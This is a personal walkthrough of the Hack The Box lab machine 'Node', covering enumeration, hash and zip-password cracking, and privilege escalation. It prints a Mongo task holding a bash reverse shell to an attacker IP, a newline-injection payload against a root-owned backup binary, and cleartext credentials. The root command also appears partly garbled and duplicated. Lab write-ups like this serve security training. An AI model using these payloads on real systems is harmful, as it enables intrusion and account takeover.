# Node

This is my write-up for the machine on Hack The Box called **Node** located at: [https://app.hackthebox.com/machines/Node](https://app.hackthebox.com/machines/Node).

I started off with an nmap scan:

![](<../../.gitbook/assets/image (438).png>)

We see 2 ports open: one for SSH and one for a software known as hadoop-datanode. Port 3000 has a web server running on it:

![](<../../.gitbook/assets/image (454) (1).png>)

I then ran **dirsearch** using the **directory-list-lowercase-2.3-medium.txt** from the dirbuster wordlist directory to see what folders/files I had access to:

`dirsearch -e php,html,js,cgi,bak,txt -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50`

This showed me the following:

![](<../../.gitbook/assets/image (706).png>)

I read up on [this write-up](https://alamot.github.io/node\_writeup/) which pointed me in the direction of using **burpsuite** in order to see requests incoming. I found one that was interesting and followed it:

![](<../../.gitbook/assets/image (422).png>)

These could be passwords or hashes. I tried the username with the passwords, and this did not work for me. Running the hash for **tom** in **hash-identifier** resulted in the following:

![](<../../.gitbook/assets/image (365).png>)

Running the other hashes resulted in **SHA-256** as well. Using the [hashcat examples website](https://hashcat.net/wiki/doku.php?id=example\_hashes), I then had to find out what the Hash-Mode was:

![](<../../.gitbook/assets/image (442).png>)

Running the hashcat command `hashcat -a 0 -m 1400 hashes rockyou.txt` got me the following:

![](<../../.gitbook/assets/image (471).png>)

It seems that I have cracked the passwords for the users **tom** and **mark**. When I login using those credentials, I get the same result:

![](<../../.gitbook/assets/image (489).png>)

Reading the same write-up from before, I missed the directory above from where I was located at:

![](<../../.gitbook/assets/image (685).png>)

This led me to find a new user: **myP14ceAdm1nAcc0uNT**. I then ran **hashcat** on the new hash (with a new wordlist - not needed, but I just did) and got the following:

![](<../../.gitbook/assets/image (700).png>)

Now we see a different output on the main screen:

![](<../../.gitbook/assets/image (664).png>)

Downloading the backup led me to a large ASCII file:

![](<../../.gitbook/assets/image (640) (1).png>)

I noticed a "**=**" at the end, so I thought it could be base64. Decoding the file led me to a zip folder where the files were password protected:

![](<../../.gitbook/assets/image (683).png>)

Following the write-up mentioned above, I ran the command `cat myplace.backup | base64 -d > backup.zip` in order to make my own zip file. This gave me the same result that I had gotten earlier from using [https://www.base64decode.org/](https://www.base64decode.org/) to decode the content of the document for me. I then uploaded zipped file on [this website](https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php) and got the following output:

![](<../../.gitbook/assets/image (474).png>)

I will go back to the [example hashes site from hashcat](https://hashcat.net/wiki/doku.php?id=example\_hashes) to see what mode this would be:

![](<../../.gitbook/assets/image (375) (1).png>)

I then ran the hashcat command `hashcat -a 0 -m 17230 pkziphash xato-net-10-million-passwords-1000000.txt` to see if I can crack the password:

![](<../../.gitbook/assets/image (413).png>)

I was then able to decode the zip by running `unzip backup.zip`. This created a new directory called **var** in my local directory. In a file called **app.js**, I found the following:

![](<../../.gitbook/assets/image (531).png>)

I was a bit lost about what to do with these credentials, I then read the same write-up again to find out that those credentials would work for **SSH**:

![](<../../.gitbook/assets/image (554).png>)

I also learned from the write-up to search for processes being run by tom:

![](<../../.gitbook/assets/image (436).png>)

I do not have a lot of experience with mongo commands work. Between the write-up I have been mentioning previously and [this write-up](https://dumbsec.ninja/htb-node-box-writeup.html) for this machine, I ran the following commands:

`mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k`

`db.tasks.insert({cmd: '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.14/1227 0>&1"'})`

I was then able to get a shell as tom:

![](<../../.gitbook/assets/image (426).png>)

I was then able to read the user.txt:

![](<../../.gitbook/assets/image (383).png>)

From the second write-up (previously mentioned), I learned about the following command, which got me directly to root using the backup process:

/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $'\n /bin/bash \n' <4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $'\n /bin/bash \n'

![](<../../.gitbook/assets/image (449).png>)

I will be honest. I have been looking at write-ups for this machine and they all seem to use buffer overflows in order to crack the command to get to the root user. I am a bit unsure how the previous command I used to get to root worked. From my understanding, it seems that the backup process was owned by root, and using the backup key, I was able to run the command. Again, not why why this command exactly.
